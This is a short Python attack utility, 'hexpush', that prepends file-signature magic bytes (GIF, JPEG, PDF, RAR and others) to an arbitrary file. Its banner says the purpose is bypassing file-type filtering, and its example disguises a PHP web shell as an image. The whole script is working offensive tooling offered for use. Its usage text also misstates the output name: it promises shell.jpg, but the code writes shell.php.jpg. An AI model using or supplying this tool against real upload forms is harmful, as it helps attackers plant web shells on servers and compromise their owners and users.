import sys

banner = """
----------------------------------
.  ..___\  /    .__ .  . __..  .
|__|[__  ><     [__)|  |(__ |__|
|  |[___/  \____|   |__|.__)|  |

----------------------------------
written by xehtsew

modfy files by adding magic numbers for 
bypassing file type filtering

usage:
./hexpush [file] [type] 

file will be saved as new file with chosen type
./hexpush shell.php [jpg] -> shell.jpg

available types:
apps	audio/video	image
----------------------------------
gzip	flac		bmp
ogg	mpeg		gif
pdf	mkv		jpg
rar			png
sqlite			psd
tar			svg
zip
----------------------------------
"""

def get_magic_numbers(filetype):
	dict = {
	"bmp"   : "NOT_IMPLEMENTED", 		# impelement
	"flac"  : "664C6143",
	"gif"   : "47494638",
	"gzip"  : "1F8B",
	"jpg"   : "ffd8ffe0",			
	"mkv"   : "NOT_IMPLEMENTED",		# impelement
	"mpeg"  : "000001B3",
	"ogg"   : "4F676753",
	"pdf"   : "255044462D",
	"png"   : "NOT_IMPLEMENTED",		# impelement
	"psd"   : "38425053",
	"rar"   : "526172211A0700",
	"sqlite": "53514C69746520666F726D6174203300",
	"svg"   : "NOT_IMPLEMENTED",		# impelement
	"tar"   : "NOT_IMPLEMENTED",		# impelement
	"zip"   : "NOT_IMPLEMENTED"		# impelement
	}
	numbers = dict.get(filetype)
	if numbers == None:
		return 'NOT_FOUND'
	return numbers

def main():
	# check and store args
	print(banner)
	n=len(sys.argv)
	if n != 3:
		print("[X] ERR: incorrect argument number")
		return
	filename = sys.argv[1]
	filetype = sys.argv[2]
	
	
	with open(filename, 'rb') as f:
		hex_data = f.read().hex()
		
	# lookup numbers in table, get errors
	magic_numbers = get_magic_numbers(filetype.lower())
	if magic_numbers == 'NOT_FOUND':
		print("[X] ERR: filetype not found")
		return
	if magic_numbers == "NOT_IMPLEMENTED":
		print("[X] ERR: not implemented")
		return
	
	# create new data blob
	new_hex = magic_numbers + hex_data
	
	try:
		new_filename = filename + "." + filetype
		
		with open(new_filename, "wb") as new_file:
			new_file.write(bytes.fromhex(new_hex))
			
		print("[O] successfully written - %s" %(new_filename))
	except Exception as error:
		print(error)
		print("[X] ERR: unhandled exception")	

if __name__ == "__main__":
	main()
